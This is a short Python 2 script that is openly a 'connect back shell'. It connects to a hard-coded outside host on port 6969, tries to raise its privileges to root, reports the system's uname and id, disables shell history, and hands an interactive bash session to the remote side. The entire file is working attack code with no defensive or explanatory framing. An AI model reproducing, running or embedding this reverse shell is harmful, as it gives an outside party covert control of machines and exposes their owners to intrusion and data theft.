import socket, os, commands, pty, sys, select
esc = '%s['%chr(27)
color = esc + "1;36m"
reset = esc + "0m"
ascii = color################################################################################
ascii +='  @@@@@@@ @@@  @@@ @@@ @@@@@@@  @@@@@@@  @@@ @@@  @@@ @@@@@@  @@@@@@  @@@@@@@ \r\n'#
ascii +=' !@@      @@!  @@@ @@! @@!  @@@ @@!  @@@ @@! !@@  @@@     @@!     @@!      @@!\r\n'#
ascii +=' !@!      @!@!@!@! !!@ @!@@!@!  @!@@!@!   !@!@!   !@!  @!!!:   @!!!:      @!! \r\n'#
ascii +=' :!!      !!:  !!! !!: !!:      !!:        !!:    !!!     !!:     !!:  .!!:   \r\n'#
ascii +='  :: :: :  :   : : :    :        :         .:     :   ::: ::  ::: ::  : :     \r\n'#
ascii +='             ~[  P R I V 8  C O N N E C T   B A C K   S H E L L  ]~           \r\n'#
ascii += reset###############################################################################
def chippyshell(host,port):
        sock = socket.socket()
        try:
            sock.connect( (host, int(port)) )
        except: pass
        else:
            print "done"
            try: os.setreuid(0,0)
            except: pass
            try: os.setuid(0)
            except: pass
            uname = commands.getoutput("uname -a")
            id = commands.getoutput("id")
            pid, childProcess = pty.fork()
            if pid == 0:
                sock.send(ascii)
                sock.send(uname+"\r\n"+id+"\r\n")
                os.putenv("HISTFILE","/dev/null")
                os.putenv("HOME",os.getcwd())
                os.putenv("PATH",'/usr/local/sbin:/usr/sbin:/sbin:/bin:/usr/local/bin:/usr/bin')
                os.putenv("TERM",'linux')
                os.putenv("PS1",color+'''\u@\h:\w\$ '''+reset)
                pty.spawn("/bin/bash")
                sock.send("\r\n")
                sock.shutdown(1)
            else:
                b = sock.makefile(os.O_RDONLY|os.O_NONBLOCK)
                c = os.fdopen(childProcess,'r+')
                y = {b:c,c:b}
                try:
                    while True:
                        for n in select.select([b,c],[],[])[0]:
                            z = os.read(n.fileno(),4096)
                            y[n].write(z)
                            y[n].flush()
                except: pass
chippyshell('perfect.blue', 6969)
